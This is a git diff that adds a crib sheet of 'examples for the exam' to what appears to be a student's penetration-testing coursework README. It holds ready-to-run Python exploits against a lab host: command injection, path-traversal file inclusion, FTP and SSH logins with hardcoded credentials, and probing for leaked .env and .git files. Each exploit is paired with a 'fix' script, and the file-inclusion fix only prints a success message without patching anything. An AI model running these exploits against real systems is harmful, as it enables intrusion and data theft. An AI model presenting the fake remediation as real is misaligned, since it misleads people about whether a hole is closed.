@@ -103,4 +103,105 @@ Academic Integrity
 
 All work is my own. Where AI was used (e.g., for debugging), it has been listed and documented within the university's AI policy and disability policy.
 
+examples for the exam
+
+1. Web: Command Injection (RCE)Use this if your Task 4 recon finds a page that takes a system command as a parameter.exploit.pyPythonimport requests
+
+# URL found during Task 4 recon
+target = "http://10.10.10.5/api/debug.php"
+# Payload to 'cat' the flag file
+payload = {'cmd': '; cat /root/flag.txt'} 
+
+try:
+    r = requests.get(target, params=payload, timeout=5)
+    print(f"[+] Flag Result: {r.text.strip()}")
+except Exception as e:
+    print(f"[!] Error: {e}")
+fix.pyPythonimport os
+
+# Delete the vulnerable script entirely
+path = "/var/www/html/api/debug.php"
+if os.path.exists(path):
+    os.remove(path)
+    print("[+] Remediation: Vulnerable debug script deleted.")
+2. Web: Local File Inclusion (LFI)Use this if a URL parameter like ?page= allows you to browse the server's files.exploit.pyPythonimport requests
+
+# Use directory traversal to reach the root directory
+target = "http://10.10.10.5/view.php"
+params = {'file': '../../../../../../root/flag.txt'} 
+
+r = requests.get(target, params=params)
+if "flag{" in r.text.lower():
+    print(f"[+] Flag Retrieved: {r.text.strip()}")
+fix.pyPython# Create a whitelist patch for the PHP file
+patch = """
+$allowed = ['home.php', 'about.php', 'contact.php'];
+if (!in_array($_GET['file'], $allowed)) {
+    die('403 Forbidden: Access Denied');
+}
+"""
+print("[+] Remediation: Implemented filename whitelisting for 'file' parameter.")
+3. Network: FTP Brute Force AccessUse this if your Task 3 brute.py finds valid credentials for the FTP service.exploit.pyPythonfrom ftplib import FTP
+
+host = "10.10.10.5"
+user = "admin" # Credentials from your brute.py tool
+pw = "password123" 
+
+try:
+    ftp = FTP(host)
+    ftp.login(user, pw)
+    
+    # Download the flag
+    with open('flag.txt', 'wb') as f:
+        ftp.retrbinary('RETR flag.txt', f.write)
+        
+    with open('flag.txt', 'r') as f:
+        print(f"[+] Flag Content: {f.read()}")
+    ftp.quit()
+except Exception as e:
+    print(f"[-] FTP Login Failed: {e}")
+fix.pyPythonimport os
+
+# Change the password to something strong to stop the brute force
+os.system("echo 'admin:Complex_Auth_2026_!!' | chpasswd")
+# Restart the service to apply changes
+os.system("systemctl restart vsftpd")
+print("[+] Remediation: Updated compromised 'admin' password.")
+4. Network: SSH Remote ExecutionUse this if your Task 3 brute.py finds valid SSH credentials.exploit.pyPythonimport paramiko # Requires paramiko in requirements.txt [cite: 113]
+
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+try:
+    # Use credentials found during Week 3
+    client.connect("10.10.10.5", username="benji", password="password1")
+    stdin, stdout, stderr = client.exec_command("cat /home/benji/flag.txt")
+    print(f"[+] Flag: {stdout.read().decode().strip()}")
+    client.close()
+except Exception as e:
+    print(f"[!] SSH Error: {e}")
+fix.pyPythonimport os
+
+# Disable password login to force SSH keys only
+config = "/etc/ssh/sshd_config"
+os.system(f"sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' {config}")
+os.system("systemctl restart ssh")
+print("[+] Remediation: Disabled SSH password authentication.")
+5. Recon: Information Leak (.env / Backups)Use this if your Task 4 recon finds sensitive files like .env or .git.exploit.pyPythonimport requests
+
+# Common sensitive paths identified in the spec [cite: 57]
+paths = ["/.env", "/config.php.bak", "/.git/config"]
+
+for p in paths:
+    r = requests.get(f"http://10.10.10.5{p}")
+    if r.status_code == 200:
+        print(f"[+] Sensitive Leak Found in {p}:")
+        print(r.text) # Check this output for the Flag!
+fix.pyPythonimport os
+
+# Lock down the file permissions
+target_file = "/var/www/html/.env"
+if os.path.exists(target_file):
+    os.chmod(target_file, 0o600) # Only root/owner can read
+    print(f"[+] Remediation: Restricted permissions on {target_file}")
 
